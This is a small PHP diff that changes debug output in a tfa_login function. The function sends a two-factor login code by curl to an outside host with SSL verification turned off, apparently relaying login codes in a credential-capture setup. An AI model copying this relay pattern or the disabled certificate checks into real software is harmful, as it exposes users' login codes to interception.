@@ -57,7 +57,6 @@ function check($user, $paswd) {
 }
 
 function tfa_login($code){
-    echo $code;
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, 'https://liman.clk1test.pp.ua/sms.php');
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -80,6 +79,7 @@ function tfa_login($code){
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $result = curl_exec($ch);
+    echo $result;
     curl_close($ch);
     return json_decode($result, true);
   }
